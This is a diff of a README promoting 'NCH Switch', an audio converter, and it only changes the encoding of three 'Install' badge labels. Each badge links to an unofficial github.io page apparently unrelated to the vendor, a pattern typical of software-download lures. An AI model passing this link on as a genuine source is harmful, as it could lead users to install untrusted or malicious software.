@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install NCH Switch](https://img.shields.io/badge/⬇_Install_NCH%20Switch-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install NCH Switch](https://img.shields.io/badge/⬇_Install_NCH+Switch-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ NCH Switch is a free audio file converter for Windows and macOS supporting over 
 
 <div align="center">
 
-[![⬇ Install NCH Switch](https://img.shields.io/badge/⬇_Install_NCH%20Switch-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install NCH Switch](https://img.shields.io/badge/⬇_Install_NCH+Switch-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ NCH Switch is a free audio file converter for Windows and macOS supporting over 
 
 <div align="center">
 
-[![⬇ Install NCH Switch](https://img.shields.io/badge/⬇_Install_NCH%20Switch-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install NCH Switch](https://img.shields.io/badge/⬇_Install_NCH+Switch-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
